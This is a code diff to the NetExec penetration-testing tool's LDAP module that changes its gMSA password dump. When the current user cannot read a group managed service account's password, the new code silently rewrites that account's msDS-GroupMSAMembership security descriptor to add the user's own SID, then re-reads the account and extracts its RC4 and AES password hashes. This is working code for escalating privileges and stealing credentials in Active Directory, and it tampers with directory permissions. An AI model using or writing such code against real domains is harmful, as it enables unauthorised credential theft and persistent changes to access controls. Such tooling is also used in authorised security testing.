@@ -44,7 +44,7 @@ from nxc.helpers.pfx import certificate_options
 from nxc.helpers.misc import get_bloodhound_info, convert, d2b, parse_argument, sanitize_dns
 from nxc.logger import NXCAdapter
 from nxc.protocols.ldap.bloodhound import BloodHound, resolve_collection_methods
-from nxc.protocols.ldap.gmsa import MSDS_MANAGEDPASSWORD_BLOB
+from nxc.protocols.ldap.gmsa import MSDS_MANAGEDPASSWORD_BLOB, add_gmsa_member
 from nxc.protocols.ldap.kerberos import KerberosAttacks
 from nxc.parsers.ldap_results import parse_result_attributes
 from nxc.helpers.negotiate_parser import parse_challenge
@@ -1412,13 +1412,85 @@ class ldap(connection):
         else:
             self.logger.fail("No entries found!")
 
+    def _authenticated_principal_sid(self):
+        """Return the authenticated sAMAccountName and SID, when resolvable."""
+        username = self.get_ldap_username() or self.username
+        username = username.removeprefix("u:") if username else username
+        if not username:
+            return None, None
+
+        response = self.search(f"(sAMAccountName={username})", ["sAMAccountName", "objectSid"], sizeLimit=1)
+        parsed = parse_result_attributes(response)
+        if not parsed or not parsed[0].get("objectSid"):
+            self.logger.debug(f"Could not resolve the authenticated principal SID for {username}")
+            return username, None
+        return parsed[0].get("sAMAccountName", username), parsed[0]["objectSid"]
+
+    def _gmsa_allowed_principals(self, membership):
+        if not membership:
+            return []
+
+        dacl = ldaptypes.SR_SECURITY_DESCRIPTOR(data=bytes(membership))["Dacl"]
+        if dacl == b"":
+            return []
+
+        sids = [ace["Ace"]["Sid"].formatCanonical() for ace in dacl.aces if ace["AceType"] == 0x00]
+        self.logger.debug(f"msDS-GroupMSAMembership: {sids}")
+        if not sids:
+            return []
+
+        search_filter = "(|" + "".join([f"(objectSid={sid})" for sid in sids]) + ")"
+        response = self.ldap_connection.search(
+            searchBase=self.baseDN,
+            searchFilter=search_filter,
+            attributes=["sAMAccountName"],
+            sizeLimit=0,
+        )
+        principals = [item["sAMAccountName"] for item in parse_result_attributes(response) if item.get("sAMAccountName")]
+        if len(principals) == 1:
+            return principals[0]
+        return principals
+
+    def _grant_gmsa_password_read(self, account, principal_name, principal_sid):
+        membership = account.get("msDS-GroupMSAMembership")
+        if not membership:
+            self.logger.debug(f"{account['sAMAccountName']} did not return msDS-GroupMSAMembership")
+            return False
+
+        try:
+            updated_membership, changed = add_gmsa_member(membership, principal_sid)
+            if changed:
+                self.ldap_connection.modify(
+                    account["distinguishedName"],
+                    {"msDS-GroupMSAMembership": [(MODIFY_REPLACE, updated_membership)]},
+                )
+                self.logger.success(f"Added {principal_name} to {account['sAMAccountName']} password readers")
+            else:
+                self.logger.debug(f"{principal_name} is already allowed to read {account['sAMAccountName']}")
+            return True
+        except ldap_impacket.LDAPSessionError as e:
+            self.logger.debug(f"Cannot update {account['sAMAccountName']} membership: {e}")
+        except Exception as e:
+            self.logger.debug(f"Cannot update {account['sAMAccountName']} membership: {e}")
+        return False
+
+    def _read_gmsa_account(self, account_name):
+        response = self.search(
+            f"(&(objectClass=msDS-GroupManagedServiceAccount)(sAMAccountName={account_name}))",
+            ["sAMAccountName", "distinguishedName", "msDS-ManagedPassword", "msDS-GroupMSAMembership"],
+            sizeLimit=1,
+        )
+        parsed = parse_result_attributes(response)
+        return parsed[0] if parsed else None
+
     def gmsa(self):
         self.logger.display("Getting GMSA Passwords")
-        search_filter = "(objectClass=msDS-GroupManagedServiceAccount)"
+        principal_name, principal_sid = self._authenticated_principal_sid()
         gmsa_accounts = self.search(
-            searchFilter=search_filter,
+            searchFilter="(objectClass=msDS-GroupManagedServiceAccount)",
             attributes=[
                 "sAMAccountName",
+                "distinguishedName",
                 "msDS-ManagedPassword",
                 "msDS-GroupMSAMembership",
             ],
@@ -1428,29 +1500,12 @@ class ldap(connection):
             self.logger.debug(f"Total of records returned {len(gmsa_accounts_parsed):d}")
 
             for acc in gmsa_accounts_parsed:
-                # PrincipalAllowedToRetrieveGMSAPassword
-                principal_with_read = []
-                if "msDS-GroupMSAMembership" in acc:
-                    msDS_GroupMSAMembership = acc["msDS-GroupMSAMembership"]
-                    dacl = ldaptypes.SR_SECURITY_DESCRIPTOR(data=bytes(msDS_GroupMSAMembership))
+                if "msDS-ManagedPassword" not in acc and principal_name and principal_sid and self._grant_gmsa_password_read(acc, principal_name, principal_sid):
+                    refreshed = self._read_gmsa_account(acc["sAMAccountName"])
+                    if refreshed:
+                        acc = refreshed
 
-                    # Get all SIDs that have the right to read the password
-                    sids = [ace["Ace"]["Sid"].formatCanonical() for ace in dacl["Dacl"]["Data"] if ace["AceType"] == 0x00]
-                    self.logger.debug(f"msDS-GroupMSAMembership: {sids}")
-                    search_filter = "(|" + "".join([f"(objectSid={sid})" for sid in sids]) + ")"
-                    resp = self.ldap_connection.search(
-                        searchBase=self.baseDN,
-                        searchFilter=search_filter,
-                        attributes=["sAMAccountName"],
-                        sizeLimit=0,
-                    )
-                    resp_parsed = parse_result_attributes(resp)
-                    if len(resp_parsed) > 1:
-                        principal_with_read = [f"{item['sAMAccountName']}" for item in resp_parsed]
-                    elif len(resp_parsed) == 1:
-                        principal_with_read = resp_parsed[0]["sAMAccountName"]
-
-                # Get the password
+                principal_with_read = self._gmsa_allowed_principals(acc.get("msDS-GroupMSAMembership"))
                 rc4 = "<no read permissions>"
                 aes128 = aes256 = ""
                 if "msDS-ManagedPassword" in acc:
